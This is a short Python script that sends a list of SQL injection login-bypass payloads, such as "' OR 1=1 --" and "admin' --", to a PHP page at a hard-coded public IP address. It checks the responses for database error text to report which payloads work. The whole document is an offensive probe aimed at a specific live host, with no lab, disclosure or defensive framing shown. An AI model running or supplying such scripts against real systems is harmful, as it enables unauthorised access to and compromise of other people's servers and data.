import requests

url = "http://203.105.230.158/hosting_info.php?id="

payloads = [
  "' OR 1=1 --",
  "' OR 1=1 #",
  "' OR 'a'='a'",
  "admin' --",
  "admin' #",
  "admin' OR '1'='1'",
  "') OR ('1'='1'",
  "') OR '1'='1'--'",
  "') OR '1'='1'#"
]

credentials ={
  "username": "admin",
  "password": ""
}

# Iterate over the payloads
for payload in payloads:
    data = {"username": credentials["username"]+payload, "password": credentials["password"]}
    response = requests.post(url, data=data)
    returnData = requests.get(url,data=data)
    if "SQL syntax" in response.text:
        print("SQL injection vulnerability detected with payload: "+payload)
    else:
        print("No SQL injection vulnerability detected with payload: "+payload)
    print(returnData)
